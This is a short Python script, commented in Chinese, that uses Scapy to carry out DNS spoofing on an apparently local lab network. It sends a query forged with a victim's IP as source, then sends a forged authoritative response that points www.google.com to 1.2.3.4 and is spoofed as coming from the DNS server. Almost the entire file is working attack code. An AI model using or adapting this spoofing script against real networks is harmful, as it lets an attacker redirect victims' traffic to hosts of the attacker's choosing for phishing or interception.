from scapy.all import *
# 設置受害者 IP 和 DNS 伺服器 IP(即Kali的IP 192.168.2.2)
victim_ip = "192.168.2.3"
dns_server_ip = "192.168.2.1"
# 建立 DNS 查詢封包
dns_query = DNS(rd=1, qd=DNSQR(qname="www.google.com"))
ip_packet = IP(src=victim_ip, dst=dns_server_ip)
udp_packet = UDP(sport=RandShort(), dport=53)
dns_request_packet = ip_packet / udp_packet / dns_query
# 發送 DNS 查詢封包並接收回應
response_packet = sr1(dns_request_packet, timeout=2, verbose=0)
# 解析 DNS 回應
if response_packet and response_packet.haslayer(DNS):
    print("Received DNS response!")
    for i in range(response_packet[DNS].ancount):
        dns_answer = response_packet[DNS].an[i]
        print("Answer {}: {}".format(i + 1, dns_answer))
    # 建立偽造的 DNS 回應封包
    dns_spoof = DNS(
        id=response_packet[DNS].id,  # 匹配請求中的 DNS id
        qr=1,  # 回應
        aa=1,  # 授權回答
        qd=response_packet[DNS].qd,  # 原始查詢
        an=DNSRR(rrname="www.google.com", ttl=60, rdata="1.2.3.4")  # 偽造回答
    )
    spoofed_packet = IP(src=dns_server_ip, dst=victim_ip) / UDP(sport=53, dport=response_packet[UDP].sport) / dns_spoof
    # 發送偽造的封包
    send(spoofed_packet, verbose=0)
else:
    print("No DNS response received.")
